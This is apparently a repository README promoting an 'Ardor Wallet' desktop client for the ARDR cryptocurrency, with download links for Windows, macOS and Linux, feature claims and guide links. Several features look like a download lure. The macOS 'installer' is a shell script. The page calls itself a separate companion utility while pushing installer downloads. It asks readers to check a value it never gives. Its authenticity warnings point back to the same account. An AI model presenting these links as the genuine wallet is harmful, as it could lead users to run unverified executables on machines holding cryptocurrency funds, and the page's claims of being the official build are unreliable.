![Ardor Wallet](assets/banner-profile.png)

<h1 align="center">Ardor Wallet</h1>

<p align="center">Self-custody ARDR on Windows, macOS and Linux, with the chain on your own machine</p>

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/blob/HEAD/LICENSE"><img src="https://img.shields.io/badge/LICENSE-AGPL--3.0-1562a1?style=for-the-badge&labelColor=0c395d" alt="License: AGPL-3.0"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5"><img src="https://img.shields.io/badge/RELEASE-v2.6.5-1562a1?style=for-the-badge&labelColor=0c395d" alt="Release v2.6.5"></a></p>

---

## Downloads - v2.6.5

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>


Compare your download against the value on [the Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

## Why Ardor Wallet

Ardor Wallet validates its own copy of the blockchain when you run it as a full client, so the balance it shows comes from data your computer checked rather than from a server's word. That choice costs disk space and a first sync, and it is the reason the wallet can forge at all.

Light client mode trades that independence for speed: no chain database, a start measured in seconds, and a balance that can lag while the remote nodes catch up. Whichever mode you pick, the passphrase stays local and the application never sends it anywhere.

- Forging from a full client, with the fees of the blocks you produce.
- A balance read locally, not an exchange ledger entry.
- Data cloud, document timestamps and privacy shuffling in the same app.
- Installers published on the release page for all three platforms.

This repository is a companion utility in the Ardor Wallet account, separate from the wallet release above.

---

## Guides

<div align="center">

| Guide | What it answers |
| --- | --- |
| [What the Ardor wallet is, and which download is the real one](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) | What the desktop client is, and which download is the genuine one. |
| [Install the Ardor wallet on Windows, macOS or Linux](https://github.com/ardor-software/ardor-wallet-guides/blob/main/install-ardor-wallet-on-windows-macos-linux.md) | Install the Ardor wallet on each platform, pick the right asset and check the Java runtime. |
| [Is the Ardor wallet safe? What to check and what to avoid](https://github.com/ardor-software/ardor-wallet-guides/blob/main/is-the-ardor-wallet-safe.md) | What makes the Ardor wallet safe in practice, and what undoes it. |
| [Back up an Ardor wallet and move it to a new computer](https://github.com/ardor-software/ardor-wallet-guides/blob/main/back-up-and-move-your-ardor-wallet.md) | Move an Ardor wallet to a new computer without losing the only secret. |

</div>

Browse every Ardor Wallet guide from [the index](https://github.com/ardor-software/ardor-software/blob/main/index.md).

---

**No support channel needs your passphrase, and anyone who asks for it is not helping you.**

---

## Support

Report a problem on [the Ardor Wallet issue tracker](https://github.com/ardor-software/ardor-desktop-wallet/issues).

## License

AGPL-3.0

[Get the current Ardor Wallet build](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5) - [guide index](https://github.com/ardor-software/ardor-software/blob/main/index.md)
